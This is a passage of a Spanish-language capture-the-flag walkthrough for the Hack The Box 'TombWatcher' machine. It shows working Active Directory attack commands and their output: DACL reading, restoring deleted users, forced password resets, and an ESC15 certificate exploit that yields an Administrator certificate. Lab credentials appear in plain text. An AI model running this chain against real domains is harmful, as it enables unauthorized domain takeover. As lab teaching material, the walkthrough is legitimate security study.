+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ dacledit.py -action <span class="s1">&#39;read&#39;</span> -principal <span class="s1">&#39;JOHN&#39;</span> -target-dn <span class="s1">&#39;ou=ADCS,dc=TOMBWATCHER,dc=htb&#39;</span> <span class="s1">&#39;tombwatcher.htb&#39;</span>/<span class="s1">&#39;JOHN&#39;</span>:<span class="s1">&#39;Micontrafavorita123!&#39;</span> -dc-ip 10.10.11.72 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Parsing DACL
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Printing parsed DACL
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Filtering results <span class="k">for</span> SID <span class="o">(</span>S-1-5-21-1392491010-1358638721-2126982587-1106<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>   ACE<span class="o">[</span>7<span class="o">]</span> info
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>     ACE Type                  : ACCESS_ALLOWED_ACE
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>     ACE flags                 : CONTAINER_INHERIT_ACE
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>     Access mask               : FullControl <span class="o">(</span>0xf01ff<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>     Trustee <span class="o">(</span>SID<span class="o">)</span>             : john <span class="o">(</span>S-1-5-21-1392491010-1358638721-2126982587-1106<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>   ACE<span class="o">[</span>8<span class="o">]</span> info
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>     ACE Type                  : ACCESS_ALLOWED_ACE
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>     ACE flags                 : CONTAINER_INHERIT_ACE, OBJECT_INHERIT_ACE
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>     Access mask               : FullControl <span class="o">(</span>0xf01ff<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>     Trustee <span class="o">(</span>SID<span class="o">)</span>             : john <span class="o">(</span>S-1-5-21-1392491010-1358638721-2126982587-1106<span class="o">)</span>
+</span></span></code></pre></div><h2 id="restaurar-objetos-en-ad-con-powershell---restoread-object">Restaurar objetos en AD con PowerShell - RestoreAD-Object<a hidden class="anchor" aria-hidden="true" href="#restaurar-objetos-en-ad-con-powershell---restoread-object">#</a></h2>
+<p>Una vez hemos heredado los permisos <code>FullControl</code> para los objetos dentro de la OU. Tenemos que ver que objetos tenemos disponibles. Dentro de Evil-WinRm comprobamos los objetos que han sido eliminados para ver si podemos restaurarlos:</p>
+<p><a href="https://www.nakivo.com/es/blog/active-directory-objects-recovery/"><img loading="lazy" src="https://images.gitbook.com/__img/dpr=1.399999976158142,width=32,onerror=redirect,height=32,fit=contain,format=auto,signature=-785347635/https%3A%2F%2Fwww.nakivo.com%2Ffavicon.ico">Cómo Restaurar Objetos Borrados en Active Directory</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">*</span><span class="nb">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">john</span><span class="p">\</span><span class="n">Documents</span><span class="p">&gt;</span> <span class="nb">Get-ADObject</span> <span class="n">-IncludeDeletedObjects</span> <span class="n">-Filter</span> <span class="p">{</span><span class="n">Isdeleted</span> <span class="o">-eq</span> <span class="vm">$true</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Deleted</span>           <span class="err">:</span> <span class="n">True</span>
+</span></span><span class="line"><span class="cl"><span class="n">DistinguishedName</span> <span class="err">:</span> <span class="n">CN</span><span class="p">=</span><span class="n">Deleted</span> <span class="n">Objects</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">tombwatcher</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">htb</span>
+</span></span><span class="line"><span class="cl"><span class="n">Name</span>              <span class="err">:</span> <span class="n">Deleted</span> <span class="n">Objects</span>
+</span></span><span class="line"><span class="cl"><span class="n">ObjectClass</span>       <span class="err">:</span> <span class="n">container</span>
+</span></span><span class="line"><span class="cl"><span class="n">ObjectGUID</span>        <span class="err">:</span> <span class="n">34509cb3</span><span class="p">-</span><span class="n">2b23</span><span class="p">-</span><span class="n">417b</span><span class="p">-</span><span class="n">8b98</span><span class="p">-</span><span class="n">13f0bd953319</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Deleted</span>           <span class="err">:</span> <span class="n">True</span>
+</span></span><span class="line"><span class="cl"><span class="n">DistinguishedName</span> <span class="err">:</span> <span class="n">CN</span><span class="p">=</span><span class="n">cert_admin</span><span class="p">\</span><span class="n">0ADEL</span><span class="err">:</span><span class="n">f80369c8</span><span class="p">-</span><span class="n">96a2</span><span class="p">-</span><span class="n">4a7f-a56c</span><span class="p">-</span><span class="n">9c15edd7d1e3</span><span class="p">,</span><span class="n">CN</span><span class="p">=</span><span class="n">Deleted</span> <span class="n">Objects</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">tombwatcher</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">htb</span>
+</span></span><span class="line"><span class="cl"><span class="n">Name</span>              <span class="err">:</span> <span class="n">cert_admin</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">DEL</span><span class="err">:</span><span class="n">f80369c8</span><span class="p">-</span><span class="n">96a2</span><span class="p">-</span><span class="n">4a7f-a56c</span><span class="p">-</span><span class="n">9c15edd7d1e3</span>
+</span></span><span class="line"><span class="cl"><span class="n">ObjectClass</span>       <span class="err">:</span> <span class="n">user</span>
+</span></span><span class="line"><span class="cl"><span class="n">ObjectGUID</span>        <span class="err">:</span> <span class="n">f80369c8</span><span class="p">-</span><span class="n">96a2</span><span class="p">-</span><span class="n">4a7f-a56c</span><span class="p">-</span><span class="n">9c15edd7d1e3</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Deleted</span>           <span class="err">:</span> <span class="n">True</span>
+</span></span><span class="line"><span class="cl"><span class="n">DistinguishedName</span> <span class="err">:</span> <span class="n">CN</span><span class="p">=</span><span class="n">cert_admin</span><span class="p">\</span><span class="n">0ADEL</span><span class="err">:</span><span class="nb">c1f1f0fe-df9c</span><span class="p">-</span><span class="n">494c-bf05</span><span class="p">-</span><span class="n">0679e181b358</span><span class="p">,</span><span class="n">CN</span><span class="p">=</span><span class="n">Deleted</span> <span class="n">Objects</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">tombwatcher</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">htb</span>
+</span></span><span class="line"><span class="cl"><span class="n">Name</span>              <span class="err">:</span> <span class="n">cert_admin</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">DEL</span><span class="err">:</span><span class="nb">c1f1f0fe-df9c</span><span class="p">-</span><span class="n">494c-bf05</span><span class="p">-</span><span class="n">0679e181b358</span>
+</span></span><span class="line"><span class="cl"><span class="n">ObjectClass</span>       <span class="err">:</span> <span class="n">user</span>
+</span></span><span class="line"><span class="cl"><span class="n">ObjectGUID</span>        <span class="err">:</span> <span class="nb">c1f1f0fe-df9c</span><span class="p">-</span><span class="n">494c-bf05</span><span class="p">-</span><span class="n">0679e181b358</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Deleted</span>           <span class="err">:</span> <span class="n">True</span>
+</span></span><span class="line"><span class="cl"><span class="n">DistinguishedName</span> <span class="err">:</span> <span class="n">CN</span><span class="p">=</span><span class="n">cert_admin</span><span class="p">\</span><span class="n">0ADEL</span><span class="err">:</span><span class="n">938182c3-bf0b</span><span class="p">-</span><span class="n">410a</span><span class="p">-</span><span class="n">9aaa</span><span class="p">-</span><span class="n">45c8e1a02ebf</span><span class="p">,</span><span class="n">CN</span><span class="p">=</span><span class="n">Deleted</span> <span class="n">Objects</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">tombwatcher</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">htb</span>
+</span></span><span class="line"><span class="cl"><span class="n">Name</span>              <span class="err">:</span> <span class="n">cert_admin</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">DEL</span><span class="err">:</span><span class="n">938182c3-bf0b</span><span class="p">-</span><span class="n">410a</span><span class="p">-</span><span class="n">9aaa</span><span class="p">-</span><span class="n">45c8e1a02ebf</span>
+</span></span><span class="line"><span class="cl"><span class="n">ObjectClass</span>       <span class="err">:</span> <span class="n">user</span>
+</span></span><span class="line"><span class="cl"><span class="n">ObjectGUID</span>        <span class="err">:</span> <span class="n">938182c3-bf0b</span><span class="p">-</span><span class="n">410a</span><span class="p">-</span><span class="n">9aaa</span><span class="p">-</span><span class="n">45c8e1a02ebf</span>
+</span></span></code></pre></div><p>Con el siguiente comando vemos los mismos objetos eliminados arriba pero con todas sus propiedades lo cual puede ser de bastante utilidad:</p>
+<p>​</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">*</span><span class="nb">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">john</span><span class="p">\</span><span class="n">Documents</span><span class="p">&gt;</span> <span class="nb">Get-ADObject</span> <span class="n">-Filter</span> <span class="s1">&#39;isDeleted -eq $true -and objectClass -eq &#34;user&#34;&#39;</span> <span class="n">-IncludeDeletedObjects</span> <span class="n">-Properties</span> <span class="p">*</span>
+</span></span></code></pre></div><p>Primero restauramos el usuario identificado como eliminado con Restore-ADObject.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">*</span><span class="nb">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">john</span><span class="p">\</span><span class="n">Documents</span><span class="p">&gt;</span> <span class="nb">Restore-ADObject</span> <span class="n">-Identity</span> <span class="s2">&#34;f80369c8-96a2-4a7f-a56c-9c15edd7d1e3&#34;</span> <span class="n">-NewName</span> <span class="s2">&#34;cert_admin1&#34;</span>
+</span></span></code></pre></div><p>Si ahora miramos los usuarios por ejemplo con el usuario henry ahora veremos que hay un usuario de más que al principio no habíamos visto:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ nxc smb 10.10.11.72 -u <span class="s1">&#39;henry&#39;</span> -p <span class="s1">&#39;H3nry_987TGV!&#39;</span> --users
+</span></span><span class="line"><span class="cl">SMB         10.10.11.72     <span class="m">445</span>    DC01             <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> / Server <span class="m">2019</span> Build <span class="m">17763</span> x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:tombwatcher.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.72     <span class="m">445</span>    DC01             <span class="o">[</span>+<span class="o">]</span> tombwatcher.htb<span class="se">\h</span>enry:H3nry_987TGV!
+</span></span><span class="line"><span class="cl">SMB         10.10.11.72     <span class="m">445</span>    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-
+</span></span><span class="line"><span class="cl">SMB         10.10.11.72     <span class="m">445</span>    DC01             Administrator                 2025-06-13 15:49:54 <span class="m">0</span>       Built-in account <span class="k">for</span> administering the computer/domain
+</span></span><span class="line"><span class="cl">SMB         10.10.11.72     <span class="m">445</span>    DC01             Guest                         &lt;never&gt;             <span class="m">0</span>       Built-in account <span class="k">for</span> guest access to the computer/domain
+</span></span><span class="line"><span class="cl">SMB         10.10.11.72     <span class="m">445</span>    DC01             krbtgt                        2024-11-16 00:02:28 <span class="m">0</span>       Key Distribution Center Service Account
+</span></span><span class="line"><span class="cl">SMB         10.10.11.72     <span class="m">445</span>    DC01             Henry                         2025-05-12 15:17:03 <span class="m">0</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.72     <span class="m">445</span>    DC01             Alfred                        2025-05-12 15:17:03 <span class="m">0</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.72     <span class="m">445</span>    DC01             sam                           2025-06-15 15:15:35 <span class="m">0</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.72     <span class="m">445</span>    DC01             john                          2025-06-15 15:16:40 <span class="m">0</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.72     <span class="m">445</span>    DC01             cert_admin                    2024-11-16 17:04:05 <span class="m">0</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.72     <span class="m">445</span>    DC01             <span class="o">[</span>*<span class="o">]</span> Enumerated <span class="m">8</span> <span class="nb">local</span> users: TOMBWATCHER
+</span></span></code></pre></div><p>Y realizamos un ForceChangePassword con <code>Net rpc</code> para luego lanzar un escaneo con bloodhound.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ net rpc password <span class="s2">&#34;cert_admin&#34;</span> <span class="s1">&#39;Micontrafavorita123!&#39;</span> -U TOMBWATCHER.HTB/JOHN%<span class="s1">&#39;Micontrafavorita123!&#39;</span> -S <span class="s2">&#34;10.10.11.72&#34;</span>
+</span></span><span class="line"><span class="cl">❯ nxc smb 10.10.11.72 -u <span class="s1">&#39;cert_admin&#39;</span> -p <span class="s1">&#39;Micontrafavorita123!&#39;</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.72     <span class="m">445</span>    DC01             <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> / Server <span class="m">2019</span> Build <span class="m">17763</span> x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:tombwatcher.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.72     <span class="m">445</span>    DC01             <span class="o">[</span>+<span class="o">]</span> tombwatcher.htb<span class="se">\c</span>ert_admin:Micontrafavorita123!
+</span></span></code></pre></div><p>Le hacemos el certipy pero no detectamos ninguna vulnerabilidad, pero cuando cuando restablecemos los otros usuarios vemos que con el ultimo nos detecta la vulnerabilidad ESC15.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">*</span><span class="nb">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">john</span><span class="p">\</span><span class="n">Documents</span><span class="p">&gt;</span> <span class="nb">Restore-ADObject</span> <span class="n">-Identity</span> <span class="s2">&#34;c1f1f0fe-df9c-494c-bf05-0679e181b358&#34;</span> <span class="n">-NewName</span> <span class="s2">&#34;cert_admin2&#34;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">*</span><span class="nb">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">john</span><span class="p">\</span><span class="n">Documents</span><span class="p">&gt;</span> <span class="nb">Restore-ADObject</span> <span class="n">-Identity</span> <span class="s2">&#34;938182c3-bf0b-410a-9aaa-45c8e1a02ebf&#34;</span> <span class="n">-NewName</span> <span class="s2">&#34;cert_admin3&#34;</span>
+</span></span></code></pre></div><p>Una vez restaurado todos los usuarios vemos que tenemos una vulnerabilidad:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ certipy find -u cert_admin@tombwatcher.htb -p Micontrafavorita123! -dc-ip 10.10.11.72 -vulnerable -stdout
+</span></span><span class="line"><span class="cl">Certipy v5.0.3 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Finding certificate templates
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found <span class="m">33</span> certificate templates
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Finding certificate authorities
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found <span class="m">1</span> certificate authority
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found <span class="m">11</span> enabled certificate templates
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Finding issuance policies
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found <span class="m">13</span> issuance policies
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found <span class="m">0</span> OIDs linked to templates
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Retrieving CA configuration <span class="k">for</span> <span class="s1">&#39;tombwatcher-CA-1&#39;</span> via RRP
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Successfully retrieved CA configuration <span class="k">for</span> <span class="s1">&#39;tombwatcher-CA-1&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Checking web enrollment <span class="k">for</span> CA <span class="s1">&#39;tombwatcher-CA-1&#39;</span> @ <span class="s1">&#39;DC01.tombwatcher.htb&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Error checking web enrollment: timed out
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Use -debug to print a stacktrace
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Enumeration output:
+</span></span><span class="line"><span class="cl">Certificate Authorities
+</span></span><span class="line"><span class="cl">  <span class="m">0</span>
+</span></span><span class="line"><span class="cl">    CA Name                             : tombwatcher-CA-1
+</span></span><span class="line"><span class="cl">    DNS Name                            : DC01.tombwatcher.htb
+</span></span><span class="line"><span class="cl">    Certificate Subject                 : <span class="nv">CN</span><span class="o">=</span>tombwatcher-CA-1, <span class="nv">DC</span><span class="o">=</span>tombwatcher, <span class="nv">DC</span><span class="o">=</span>htb
+</span></span><span class="line"><span class="cl">    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC
+</span></span><span class="line"><span class="cl">    Certificate Validity Start          : 2024-11-16 00:47:48+00:00
+</span></span><span class="line"><span class="cl">    Certificate Validity End            : 2123-11-16 00:57:48+00:00
+</span></span><span class="line"><span class="cl">    Web Enrollment
+</span></span><span class="line"><span class="cl">      HTTP
+</span></span><span class="line"><span class="cl">        Enabled                         : False
+</span></span><span class="line"><span class="cl">      HTTPS
+</span></span><span class="line"><span class="cl">        Enabled                         : False
+</span></span><span class="line"><span class="cl">    User Specified SAN                  : Disabled
+</span></span><span class="line"><span class="cl">    Request Disposition                 : Issue
+</span></span><span class="line"><span class="cl">    Enforce Encryption <span class="k">for</span> Requests     : Enabled
+</span></span><span class="line"><span class="cl">    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+</span></span><span class="line"><span class="cl">    Permissions
+</span></span><span class="line"><span class="cl">      Owner                             : TOMBWATCHER.HTB<span class="se">\A</span>dministrators
+</span></span><span class="line"><span class="cl">      Access Rights
+</span></span><span class="line"><span class="cl">        ManageCa                        : TOMBWATCHER.HTB<span class="se">\A</span>dministrators
+</span></span><span class="line"><span class="cl">                                          TOMBWATCHER.HTB<span class="se">\D</span>omain Admins
+</span></span><span class="line"><span class="cl">                                          TOMBWATCHER.HTB<span class="se">\E</span>nterprise Admins
+</span></span><span class="line"><span class="cl">        ManageCertificates              : TOMBWATCHER.HTB<span class="se">\A</span>dministrators
+</span></span><span class="line"><span class="cl">                                          TOMBWATCHER.HTB<span class="se">\D</span>omain Admins
+</span></span><span class="line"><span class="cl">                                          TOMBWATCHER.HTB<span class="se">\E</span>nterprise Admins
+</span></span><span class="line"><span class="cl">        Enroll                          : TOMBWATCHER.HTB<span class="se">\A</span>uthenticated Users
+</span></span><span class="line"><span class="cl">Certificate Templates
+</span></span><span class="line"><span class="cl">  <span class="m">0</span>
+</span></span><span class="line"><span class="cl">    Template Name                       : WebServer
+</span></span><span class="line"><span class="cl">    Display Name                        : Web Server
+</span></span><span class="line"><span class="cl">    Certificate Authorities             : tombwatcher-CA-1
+</span></span><span class="line"><span class="cl">    Enabled                             : True
+</span></span><span class="line"><span class="cl">    Client Authentication               : False
+</span></span><span class="line"><span class="cl">    Enrollment Agent                    : False
+</span></span><span class="line"><span class="cl">    Any Purpose                         : False
+</span></span><span class="line"><span class="cl">    Enrollee Supplies Subject           : True
+</span></span><span class="line"><span class="cl">    Certificate Name Flag               : EnrolleeSuppliesSubject
+</span></span><span class="line"><span class="cl">    Extended Key Usage                  : Server Authentication
+</span></span><span class="line"><span class="cl">    Requires Manager Approval           : False
+</span></span><span class="line"><span class="cl">    Requires Key Archival               : False
+</span></span><span class="line"><span class="cl">    Authorized Signatures Required      : <span class="m">0</span>
+</span></span><span class="line"><span class="cl">    Schema Version                      : <span class="m">1</span>
+</span></span><span class="line"><span class="cl">    Validity Period                     : <span class="m">2</span> years
+</span></span><span class="line"><span class="cl">    Renewal Period                      : <span class="m">6</span> weeks
+</span></span><span class="line"><span class="cl">    Minimum RSA Key Length              : <span class="m">2048</span>
+</span></span><span class="line"><span class="cl">    Template Created                    : 2024-11-16T00:57:49+00:00
+</span></span><span class="line"><span class="cl">    Template Last Modified              : 2024-11-16T17:07:26+00:00
+</span></span><span class="line"><span class="cl">    Permissions
+</span></span><span class="line"><span class="cl">      Enrollment Permissions
+</span></span><span class="line"><span class="cl">        Enrollment Rights               : TOMBWATCHER.HTB<span class="se">\D</span>omain Admins
+</span></span><span class="line"><span class="cl">                                          TOMBWATCHER.HTB<span class="se">\E</span>nterprise Admins
+</span></span><span class="line"><span class="cl">                                          TOMBWATCHER.HTB<span class="se">\c</span>ert_admin3
+</span></span><span class="line"><span class="cl">      Object Control Permissions
+</span></span><span class="line"><span class="cl">        Owner                           : TOMBWATCHER.HTB<span class="se">\E</span>nterprise Admins
+</span></span><span class="line"><span class="cl">        Full Control Principals         : TOMBWATCHER.HTB<span class="se">\D</span>omain Admins
+</span></span><span class="line"><span class="cl">                                          TOMBWATCHER.HTB<span class="se">\E</span>nterprise Admins
+</span></span><span class="line"><span class="cl">        Write Owner Principals          : TOMBWATCHER.HTB<span class="se">\D</span>omain Admins
+</span></span><span class="line"><span class="cl">                                          TOMBWATCHER.HTB<span class="se">\E</span>nterprise Admins
+</span></span><span class="line"><span class="cl">        Write Dacl Principals           : TOMBWATCHER.HTB<span class="se">\D</span>omain Admins
+</span></span><span class="line"><span class="cl">                                          TOMBWATCHER.HTB<span class="se">\E</span>nterprise Admins
+</span></span><span class="line"><span class="cl">        Write Property Enroll           : TOMBWATCHER.HTB<span class="se">\D</span>omain Admins
+</span></span><span class="line"><span class="cl">                                          TOMBWATCHER.HTB<span class="se">\E</span>nterprise Admins
+</span></span><span class="line"><span class="cl">                                          TOMBWATCHER.HTB<span class="se">\c</span>ert_admin3
+</span></span><span class="line"><span class="cl">    <span class="o">[</span>+<span class="o">]</span> User Enrollable Principals      : TOMBWATCHER.HTB<span class="se">\c</span>ert_admin3
+</span></span><span class="line"><span class="cl">    <span class="o">[</span>!<span class="o">]</span> Vulnerabilities
+</span></span><span class="line"><span class="cl">      ESC15                             : Enrollee supplies subject and schema version is 1.
+</span></span><span class="line"><span class="cl">    <span class="o">[</span>*<span class="o">]</span> Remarks
+</span></span><span class="line"><span class="cl">      ESC15                             : Only applicable <span class="k">if</span> the environment has not been patched. See CVE-2024-49019 or the wiki <span class="k">for</span> more details.
+</span></span></code></pre></div><h2 id="explotación-esc15---certipy">Explotación ESC15 - Certipy<a hidden class="anchor" aria-hidden="true" href="#explotación-esc15---certipy">#</a></h2>
+<p><a href="https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu">https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ certipy req <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -u <span class="s1">&#39;cert_admin@TOMBWATCHER.HTB&#39;</span> -p <span class="s1">&#39;Micontrafavorita123!&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -dc-ip <span class="s1">&#39;10.10.11.72&#39;</span> -target <span class="s1">&#39;TOMBWATCHER.HTB&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -ca <span class="s1">&#39;tombwatcher-CA-1&#39;</span> -template <span class="s1">&#39;WebServer&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -application-policies <span class="s1">&#39;Certificate Request Agent&#39;</span>
+</span></span><span class="line"><span class="cl">Certipy v5.0.3 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Requesting certificate via RPC
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Request ID is <span class="m">10</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Successfully requested certificate
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Got certificate without identity
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Certificate has no object SID
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Try using -sid to <span class="nb">set</span> the object SID or see the wiki <span class="k">for</span> more details
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saving certificate and private key to <span class="s1">&#39;cert_admin.pfx&#39;</span>
+</span></span><span class="line"><span class="cl">File <span class="s1">&#39;cert_admin.pfx&#39;</span> already exists. Overwrite? <span class="o">(</span>y/n - saying no will save with a unique filename<span class="o">)</span>: y
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Wrote certificate and private key to <span class="s1">&#39;cert_admin.pfx&#39;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ certipy req <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -u <span class="s1">&#39;cert_admin@TOMBWATCHER.HTB&#39;</span> -p <span class="s1">&#39;Micontrafavorita123!&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -dc-ip <span class="s1">&#39;10.10.11.72&#39;</span> -target <span class="s1">&#39;TOMBWATCHER.HTB&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -ca <span class="s1">&#39;tombwatcher-CA-1&#39;</span> -template <span class="s1">&#39;User&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -pfx <span class="s1">&#39;cert_admin.pfx&#39;</span> -on-behalf-of <span class="s1">&#39;TOMBWATCHER\Administrator&#39;</span>
+</span></span><span class="line"><span class="cl">Certipy v5.0.3 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Requesting certificate via RPC
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Request ID is <span class="m">12</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Successfully requested certificate
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Got certificate with UPN <span class="s1">&#39;Administrator@tombwatcher.htb&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Certificate object SID is <span class="s1">&#39;S-1-5-21-1392491010-1358638721-2126982587-500&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saving certificate and private key to <span class="s1">&#39;administrator.pfx&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Wrote certificate and private key to <span class="s1">&#39;administrator.pfx&#39;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ certipy auth -pfx <span class="s1">&#39;administrator.pfx&#39;</span> -dc-ip <span class="s1">&#39;10.10.11.72&#39;</span>
